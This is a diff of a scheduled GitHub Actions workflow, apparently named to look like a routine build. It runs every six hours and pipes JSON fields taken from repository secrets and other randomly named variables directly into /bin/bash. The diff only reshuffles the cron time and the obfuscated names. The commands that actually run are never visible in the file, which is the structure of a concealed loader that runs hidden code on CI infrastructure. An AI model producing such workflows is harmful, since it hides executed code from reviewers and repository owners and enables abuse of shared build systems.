@@ -1,9 +1,9 @@
 name: maturehometeam
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-
+    - cron: '54 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: maturehometeam
         env:
-          jvrqc38: ${{ secrets.jvrqc38 }}
+          f03: ${{ secrets.f03 }}
         run: |
-          echo $jvrqc38 | jq -r .b134 | /bin/bash
-          echo $wdr10637 | jq -r .orhj4 | /bin/bash
-          echo $dbghs1442 | jq -r .gzfk0309 | /bin/bash
+          echo $f03 | jq -r .fzlh864 | /bin/bash
+          echo $iqcvz85 | jq -r .li3862 | /bin/bash
+          echo $h6 | jq -r .fgikf1695 | /bin/bash
+          echo $iwvb894 | jq -r .srpyv93 | /bin/bash
 
